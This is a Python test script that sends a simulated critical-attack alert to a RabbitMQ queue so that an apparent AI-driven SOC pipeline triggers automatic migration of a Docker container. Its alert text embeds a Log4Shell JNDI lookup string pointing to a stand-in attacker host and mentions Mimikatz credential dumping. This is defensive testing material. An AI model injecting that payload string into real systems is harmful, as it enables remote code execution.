import json
import uuid
import time
import pika

# 配置 RabbitMQ
RABBITMQ_HOST = 'localhost'
RABBITMQ_USER = 'user'      
RABBITMQ_PASS = 'password'  
QUEUE_NAME = 'cti_queue'

def send_critical_attack():
    credentials = pika.PlainCredentials(RABBITMQ_USER, RABBITMQ_PASS)
    parameters = pika.ConnectionParameters(host=RABBITMQ_HOST, credentials=credentials)
    
    try:
        connection = pika.BlockingConnection(parameters)
        channel = connection.channel()
        channel.queue_declare(queue=QUEUE_NAME, durable=True)

        # 🎯 關鍵修改：將 Source 改為真實的容器名稱 "cti-ui"
        REAL_TARGET_CONTAINER = "ai-powered-autonomous-soc-cti-pipeline-worker-1"

        attack_message = (
            f"CRITICAL ALERT: Internal lateral movement detected. "
            f"Source: {REAL_TARGET_CONTAINER} (compromised-container) → Target: 10.0.0.20 (dc-primary-01). "
            "Service: MS-RPC/SMB (port 445). "
            "Action: LSASS credential dumping via T1003.001 (Mimikatz). "
            "Payload: ${jndi:ldap://attacker.com/Exploit} detected in HTTP headers. "
            "CVE-2021-44228 exploitation confirmed. "
            "Attack chain: Credential Dumping → Lateral Movement → Domain Controller compromise. "
            "Severity: CRITICAL. Immediate isolation required."
        )

        attack_event = {
            "filename": f"RAW_{uuid.uuid4()}.log",
            "message": attack_message,
            "source_ip": REAL_TARGET_CONTAINER, # 👈 MTD 會根據這個名稱去找 Docker 容器
            "target_ip": "10.0.0.20",
            "attack_type": "Credential Dumping & Lateral Movement",
            "cve_id": "CVE-2021-44228",
            "severity": "Critical",
            "confidence": 97,
            "tenant_id": "default",
        }

        channel.basic_publish(
            exchange='',
            routing_key=QUEUE_NAME,
            body=json.dumps(attack_event),
            properties=pika.BasicProperties(delivery_mode=2)
        )
        
        print(f"🚀 [SUCCESS] 攻擊指令已發送！")
        print(f"🎯 模擬受害目標：{REAL_TARGET_CONTAINER} (真實容器)")
        print(f"🔥 預期行為：MTD 將觸發 {REAL_TARGET_CONTAINER} 的自動遷移")
        connection.close()
    except Exception as e:
        print(f"❌ 發送失敗: {e}")

if __name__ == "__main__":
    send_critical_attack()